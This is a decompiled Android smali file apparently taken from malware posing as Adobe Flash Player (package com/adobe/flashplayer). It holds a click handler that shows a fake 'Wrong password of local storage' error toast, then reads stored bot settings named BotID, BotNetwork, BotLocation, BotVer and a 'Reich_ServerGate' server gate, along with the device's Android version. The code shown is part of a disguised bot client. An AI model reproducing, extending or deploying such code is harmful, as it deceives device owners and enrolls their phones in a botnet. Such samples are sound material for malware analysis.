.class Lcom/adobe/flashplayer/CT$2;
.super Ljava/lang/Object;
.source "CT.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/adobe/flashplayer/CT;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/adobe/flashplayer/CT;


# direct methods
.method constructor <init>(Lcom/adobe/flashplayer/CT;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/adobe/flashplayer/CT$2;->this$0:Lcom/adobe/flashplayer/CT;

    .line 59
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 10
    .param p1, "v"    # Landroid/view/View;

    .prologue
    .line 62
    iget-object v7, p0, Lcom/adobe/flashplayer/CT$2;->this$0:Lcom/adobe/flashplayer/CT;

    invoke-virtual {v7}, Lcom/adobe/flashplayer/CT;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    const-string v8, "Deleting error.\n\nWrong password of local storage. Please, try again."

    const/4 v9, 0x1

    invoke-static {v7, v8, v9}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v7

    invoke-virtual {v7}, Landroid/widget/Toast;->show()V

    .line 63
    iget-object v7, p0, Lcom/adobe/flashplayer/CT$2;->this$0:Lcom/adobe/flashplayer/CT;

    const-string v8, "BotID"

    iget-object v9, p0, Lcom/adobe/flashplayer/CT$2;->this$0:Lcom/adobe/flashplayer/CT;

    invoke-virtual {v9}, Lcom/adobe/flashplayer/CT;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    invoke-static {v7, v8, v9}, Lcom/adobe/flashplayer/CT;->access$0(Lcom/adobe/flashplayer/CT;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    .line 64
    .local v0, "BotID":Ljava/lang/String;
    iget-object v7, p0, Lcom/adobe/flashplayer/CT$2;->this$0:Lcom/adobe/flashplayer/CT;

    const-string v8, "BotNetwork"

    iget-object v9, p0, Lcom/adobe/flashplayer/CT$2;->this$0:Lcom/adobe/flashplayer/CT;

    invoke-virtual {v9}, Lcom/adobe/flashplayer/CT;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    invoke-static {v7, v8, v9}, Lcom/adobe/flashplayer/CT;->access$0(Lcom/adobe/flashplayer/CT;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    .line 65
    .local v2, "BotNetwork":Ljava/lang/String;
    iget-object v7, p0, Lcom/adobe/flashplayer/CT$2;->this$0:Lcom/adobe/flashplayer/CT;

    const-string v8, "BotLocation"

    iget-object v9, p0, Lcom/adobe/flashplayer/CT$2;->this$0:Lcom/adobe/flashplayer/CT;

    invoke-virtual {v9}, Lcom/adobe/flashplayer/CT;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    invoke-static {v7, v8, v9}, Lcom/adobe/flashplayer/CT;->access$0(Lcom/adobe/flashplayer/CT;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    .line 67
    .local v1, "BotLocation":Ljava/lang/String;
    iget-object v7, p0, Lcom/adobe/flashplayer/CT$2;->this$0:Lcom/adobe/flashplayer/CT;

    const-string v8, "Reich_ServerGate"

    iget-object v9, p0, Lcom/adobe/flashplayer/CT$2;->this$0:Lcom/adobe/flashplayer/CT;

    invoke-virtual {v9}, Lcom/adobe/flashplayer/CT;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    invoke-static {v7, v8, v9}, Lcom/adobe/flashplayer/CT;->access$0(Lcom/adobe/flashplayer/CT;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    .line 68
    .local v4, "Reich_ServerGate":Ljava/lang/String;
    iget-object v7, p0, Lcom/adobe/flashplayer/CT$2;->this$0:Lcom/adobe/flashplayer/CT;

    const-string v8, "BotVer"

    iget-object v9, p0, Lcom/adobe/flashplayer/CT$2;->this$0:Lcom/adobe/flashplayer/CT;

    invoke-virtual {v9}, Lcom/adobe/flashplayer/CT;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    invoke-static {v7, v8, v9}, Lcom/adobe/flashplayer/CT;->access$0(Lcom/adobe/flashplayer/CT;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    .line 69
    .local v3, "BotVer":Ljava/lang/String;
    sget-object v5, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    .line 70
    .local v5, "SDK":Ljava/lang/String;
    const-string v6, ""

    .line 74
    .local v6, "prefix":Ljava/lang/String;
    return-void
.end method
